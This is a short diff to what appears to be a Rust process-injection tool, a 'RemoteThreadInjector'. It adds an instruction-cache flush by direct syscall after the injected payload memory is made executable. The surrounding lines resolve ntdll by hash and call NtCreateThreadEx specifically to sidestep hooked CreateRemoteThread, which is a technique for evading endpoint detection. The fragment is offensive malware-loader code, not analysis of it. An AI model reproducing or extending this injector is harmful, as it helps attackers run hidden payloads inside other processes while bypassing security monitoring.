@@ -104,6 +104,13 @@ impl Injector for RemoteThreadInjector {
                 _ => cleanup_and_err!("RemoteThread: NtProtectVirtualMemory to RX failed"),
             }
 
+            // Flush I-cache before creating the new thread.  Required for
+            // correctness on ARM64 and defense-in-depth on x86_64.
+            nt_syscall::syscall!(
+                "NtFlushInstructionCache",
+                h_proc as u64, remote_mem as u64, payload.len() as u64,
+            ).ok();
+
             // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
             let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
             let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
